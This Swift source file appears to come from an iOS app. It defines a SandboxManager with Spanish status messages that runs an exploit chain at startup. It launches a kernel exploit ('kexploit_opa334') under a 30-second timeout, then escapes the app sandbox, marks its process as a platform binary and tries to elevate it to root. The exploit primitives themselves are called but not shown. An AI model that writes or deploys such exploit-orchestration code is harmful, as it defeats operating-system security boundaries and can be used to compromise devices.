import Foundation

enum SandboxStatus {
    case idle
    case initializing
    case ready(method: String)
    case failed(String)

    var isReady: Bool {
        if case .ready = self { return true }
        return false
    }

    var displayText: String {
        switch self {
        case .idle: return "Esperando..."
        case .initializing: return "Preparando acceso..."
        case .ready(let method): return "Listo (\(method))"
        case .failed(let msg): return "Error: \(msg)"
        }
    }
}

final class SandboxManager {
    static let shared = SandboxManager()

    private(set) var status: SandboxStatus = .idle
    private let lock = NSLock()

    static let statusDidChange = Notification.Name("FDSandboxStatusDidChange")

    private init() {}

    func prepareAccess() {
        lock.lock()
        guard case .idle = status else { lock.unlock(); return }
        status = .initializing
        lock.unlock()
        postStatus()

        DispatchQueue.global(qos: .userInitiated).async { [self] in
            let result = runEscapeSequence()
            lock.lock()
            status = result
            lock.unlock()
            postStatus()
        }
    }

    private(set) var hasFullEscape = false

    private func runEscapeSequence() -> SandboxStatus {
        let ver = FDDeviceInfo.versionTuple

        NSLog("[FD] Escape sequence: iOS %d.%d.%d",
              ver.major, ver.minor, ver.patch)

        // Step 1: Initialize container engine (WQ-SYM + WQ-PD + MCM-C7 + BQ)
        let accessible = FDContainerEngineInit()
        let active = sandbox_access_is_active()

        NSLog("[FD] Engine init result: accessible=%d sandbox_active=%d",
              accessible, active)

        // Step 2: Post partial status so app is usable while kexploit runs
        if accessible > 0 || active != 0 {
            lock.lock()
            status = .ready(method: active != 0 ? "WQ-SYM" : "WQ-SYM (parcial \(accessible))")
            lock.unlock()
            postStatus()
        }

        // Step 3: Try kexploit in background with timeout
        let supportsKernel = FDSupportPolicy.isSupported(
            major: ver.major, minor: ver.minor, patch: ver.patch
        )

        if supportsKernel {
            NSLog("[FD] Kernel offsets available, running kexploit_opa334 (timeout 30s)...")

            var exploitResult: Int32 = -999
            let sem = DispatchSemaphore(value: 0)

            let exploitThread = Thread {
                exploitResult = kexploit_opa334()
                sem.signal()
            }
            exploitThread.qualityOfService = .userInitiated
            exploitThread.start()

            let timeout = sem.wait(timeout: .now() + 30)

            if timeout == .timedOut {
                NSLog("[FD] kexploit TIMEOUT after 30s — OOB primitive likely patched on iOS %d.%d", ver.major, ver.minor)
                kexploit_request_stop(99)
            } else if exploitResult == 0 {
                NSLog("[FD] kexploit OK, running sandbox_escape...")
                let selfProc = proc_self()

                let escapeResult = sandbox_escape(selfProc)
                NSLog("[FD] sandbox_escape result: %d", escapeResult)

                let _ = sandbox_set_platform_binary(selfProc)
                NSLog("[FD] sandbox_set_platform_binary done")

                let rootResult = sandbox_elevate_to_root(selfProc)
                NSLog("[FD] sandbox_elevate_to_root result: %d", rootResult)

                let activeAfterEscape = sandbox_access_is_active() != 0
                NSLog("[FD] sandbox_active after full escape: %d uid=%d", activeAfterEscape ? 1 : 0, getuid())

                if activeAfterEscape || escapeResult == 0 || rootResult == 0 {
                    hasFullEscape = true
                    let uid = getuid()
                    let method = uid == 0 ? "kexploit + root (uid=0)" : "kexploit + sandbox_escape"
                    return .ready(method: method)
                }
            } else {
                NSLog("[FD] kexploit failed: KXP-%d", abs(exploitResult))
            }
        } else {
            NSLog("[FD] No kernel offsets for iOS %d.%d", ver.major, ver.minor)
        }

        // Step 4: Return WQ-SYM status
        if active != 0 {
            return .ready(method: "WQ-SYM")
        }
        if accessible > 0 {
            return .ready(method: "WQ-SYM (parcial \(accessible))")
        }
        return .ready(method: "WQ (sin verificar)")
    }

    private func postStatus() {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: Self.statusDidChange, object: self.status)
        }
    }
}
